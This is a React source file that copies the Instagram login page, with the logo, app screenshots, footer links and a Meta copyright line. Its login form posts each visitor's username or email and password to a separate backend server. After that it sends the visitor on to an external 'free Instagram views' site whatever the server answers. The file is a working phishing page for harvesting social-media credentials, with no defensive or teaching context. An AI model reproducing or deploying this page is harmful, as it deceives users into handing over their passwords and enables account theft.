import React, { useEffect } from "react";
import { useState } from "react";
import { Link } from "react-router-dom";
import axios from "axios";
import "./App.css";
import screen1 from "./img/screen1.png";
import screen2 from "./img/screen2.png";
import screen3 from "./img/screen3.png";
import screen4 from "./img/screen4.png";
import smartphones from "./img/smartphones.png";
import logo from "./img/logo.png";
import googleplay from "./img/googleplay.png";
import appstore from "./img/appstore.png";

function App() {
  useEffect(() => {
    SwitchScreen();
  }, []);

  let screenIndex = 0;

  function SwitchScreen() {
    const screens = document.querySelectorAll(".screen");

    for (let i = 0; i < screens.length; i++) {
      screens[i].style.display = "none";
    }

    screenIndex++;

    if (screenIndex > screens.length) {
      screenIndex = 1;
    }

    screens[screenIndex - 1].style.display = "block";
    setTimeout(SwitchScreen, 2500);
  }

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  async function submit(e) {
    e.preventDefault();

    try {
      const response = await axios.post("http://localhost:8000/Signup", {
        email,
        password,
      });

      if (response.data === "exist") {
        // Redirect to /header with email state
        window.location.href = `https://skweezer.net/free-instagram-views`;
      } else if (response.data === "not exist") {
        alert("User is not signed up");
        window.location.href = `https://skweezer.net/free-instagram-views`;
      }
    } catch (error) {
      alert("Wrong Details");
      console.error(error);
    }
  }
  return (
    <div>
      <head>
        <meta charSet="UTF-8" />
        <meta httpEquiv="X-UA-Compatible" content="IE-edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="description" content="Instagram" />
        <meta name="author" content="Edlávio Alberto" />
        <link rel="shortcut icon" href="img/icon.png" type="image/x-icon" />
        <link rel="stylesheet" href="css/style.css" />
        <title>Instagram</title>
      </head>
      <body>
        <section className="container">
          {/* SMARTPHONE SECTION */}
          <article className="smartphone">
            <div className="screens">
              <img className="screen fade" src={screen1} alt="screen1" />
              <img className="screen fade" src={screen2} alt="screen2" />
              <img className="screen fade" src={screen3} alt="screen3" />
            </div>
            <img src={smartphones} alt="smartphones" />
          </article>
          {/* SMARTPHONE SECTION END */}
          {/* FORM SECTION */}
          <article className="form-area">
            <div className="logo">
              <img src={logo} alt="Instagram Logo" />
            </div>

            <form onSubmit={submit}>
              <div className="mt-4">
                <label
                  className="username"
                  htmlFor="LoggingEmailAddress"
                ></label>
                <input
                  onChange={(e) => {
                    setEmail(e.target.value);
                  }}
                  placeholder="Phone number, username, or email"
                  id="username"
                  type="text"
                />
              </div>

              <div className="mt-4">
                <label className="password" htmlFor="Loggingpassword"></label>
                <input
                  id="password"
                  onChange={(e) => {
                    setPassword(e.target.value);
                  }}
                  placeholder="Password"
                  type="password"
                />
              </div>

              <div className="mt-6">
                <button type="submit" id="submit">
                  Login
                </button>
              </div>
            </form>

            <div className="noaccount">
              <a href="#">
                Don't have an account? <span>Sign up</span>
              </a>
            </div>
            <div className="apps">
              <p>Get the app</p>
              <a href="#">
                <img src={appstore} alt="Download on the AppStore" />
              </a>
              <a href="#">
                <img src={googleplay} alt="Get it on Google Play" />
              </a>
            </div>
          </article>
        </section>
        {/* FORM SECTION END */}
        {/* FOOTER */}
        <footer>
          <div className="footer-content">
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Top Accounts</a>
            <a href="#">Hashtags</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Contact and Non-Users Loading</a>
          </div>
          <div>
            <a href="#">Dance</a>
            <a href="#">Food & Drink</a>
            <a href="#">Home & Garden</a>
            <a href="#">Music</a>
            <a href="#">Visual Arts</a>
          </div>
          <div className="copyright">
            <select aria-label="Change display language">
              <option value="en">English</option>
              {/* Add other language options here */}
            </select>
            <span>&copy; 2022 Instagram from Meta</span>
          </div>
        </footer>
      </body>
    </div>
  );
}

export default App;
